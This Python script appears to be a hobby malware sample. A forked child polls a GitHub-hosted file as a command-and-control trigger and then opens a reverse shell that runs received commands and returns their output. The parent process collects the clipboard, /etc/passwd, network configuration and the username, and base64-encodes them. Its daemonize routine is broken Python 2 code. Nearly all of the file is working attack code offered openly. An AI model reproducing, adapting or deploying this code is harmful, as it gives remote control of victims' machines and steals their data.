#!/usr/bin/env python3

import os, sys, paramiko
import socket
#from socket import *
from logzero import logger
import time
import subprocess
import tkinter
import base64
import requests



# Function to daemonize code
def daemonize(self):
    try:
            pid = os.fork()
            if pid > 0:
                    # exit first parent
                    sys.exit(0)
    except OSError as e:
            sys.stderr.write("fork #1 failed: %d (%s)\n" % (e.errno, e.strerror))
            sys.exit(1)

    # decouple from parent environment
    os.chdir("/tmp/")
    os.setsid()
    os.umask(0)

    # do second fork
    try:
            pid = os.fork()
            if pid > 0:
                    # exit from second parent
                    sys.exit(0)
    except OSError as e:
            sys.stderr.write("fork #2 failed: %d (%s)\n" % (e.errno, e.strerror))
            sys.exit(1)

    # redirect standard file descriptors
    sys.stdout.flush()
    sys.stderr.flush()

    si = file(self.stdin, 'r')
    so = file(self.stdout, 'a+')
    se = file(self.stderr, 'a+', 0)

    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())

    # write pidfile
    atexit.register(self.delpid)
    file(self.pidfile,'w+').write("%s\n" % pid)

def revTCP():
        # Main loop for reverse TCP connection
        while True:
        # Accepts the incoming connection once one is ended
        # Socket gets declared
        # Creates socket connection
                mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                mySocket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

                try:
                        mySocket.connect(('127.0.0.1',1234))
                except:
                        break
        #commandOut.append(subprocess.check_output(['ls', '-l']))
        #commandOut.append(subprocess.check_output(['whoami']))
        #commandOut.append(subprocess.check_output(['ifconfig']))
        ##commandOut = []
        ### Command i want to execute will run and return/send the output of that command to my catch server.
        ##commandOut.append(subprocess.check_output(['whoami']))
        ##mySocket.send(f"{commandOut}".encode('utf-8'))
                try:
                        while True:
                                command = mySocket.recv(1024).decode('utf-8')
                                if command == 'q':
                                        mySocket.close()
                                        sys.exit(0)
                                else:
                                        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                        output = proc.stdout.read() + proc.stderr.read()
                                        mySocket.send(str(output).encode('utf-8'))
                except KeyboardInterrupt:
                        mySocket.close()
                        sys.exit(0)
                mySocket.close()

#daemonize
pid = os.fork()

if pid == 0:
        while True:
                time.sleep(3)
                url = "https://raw.githubusercontent.com/noahpop77/malCode/master/con.txt"
                req = requests.get(url)
                print(req.text)
                if req.text == "1\n":
                        revTCP()
                else:
                        pass
                        #sys.exit(0)
                #print(req.text)
        sys.exit(0)
if pid > 0:
        # Rips the information from the clipboard
        infoReport = []
        myClip = tkinter.Tk()
        myClip.withdraw()
        pasteClip = myClip.clipboard_get()

        #time.sleep(100)
        infoReport.append(pasteClip)
        infoReport.append(subprocess.check_output(['cat', '/etc/passwd']))
        #infoReport.append(subprocess.check_output(['ip', 'a']))
        infoReport.append(subprocess.check_output(['ifconfig']))
        infoReport.append(subprocess.check_output(['whoami']))
        #infoReport.append(subprocess.check_output(['ip', 'r']))

        encodedData = base64.b64encode(str(infoReport).encode('utf-8'))
        enccodedStr = str(encodedData, "utf-8")
        print(enccodedStr)
        sys.exit(0)